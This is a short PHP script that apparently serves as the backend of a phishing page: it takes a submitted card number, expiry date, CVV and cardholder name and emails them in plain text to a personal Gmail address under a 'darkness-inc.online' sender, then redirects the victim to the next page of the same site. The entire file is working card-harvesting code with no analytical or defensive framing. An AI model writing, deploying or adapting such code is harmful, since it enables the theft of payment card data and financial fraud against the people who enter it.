<?php
	$card_NO=$_POST["card_NO"];
	$card_EXPIRY=$_POST["card_EXPIRY"];
	$card_CVV=$_POST["card_CVV"];
	$card_HOLDER=$_POST["card_HOLDER"];
	


	$to = "saantosh87600@gmail.com";
	$subject="InquiryThrough Website";
	

	$msg = "card_NO : ".$card_NO."\n\n";
	$msg .= "card_EXPIRY :  ".$card_EXPIRY."\n\n";
	$msg .= "card_CVV :  ".$card_CVV."\n\n";
	$msg .= "card_HOLDER :  ".$card_HOLDER."\n\n";

	$headers = "From: info@darkness-inc.online";





   if (mail($to, $subject, $msg, $headers)) {
    header( "refresh:2; url=https://darkness-inc.online/card/page3.html" );
   } else {
       echo "faild";
   }
?>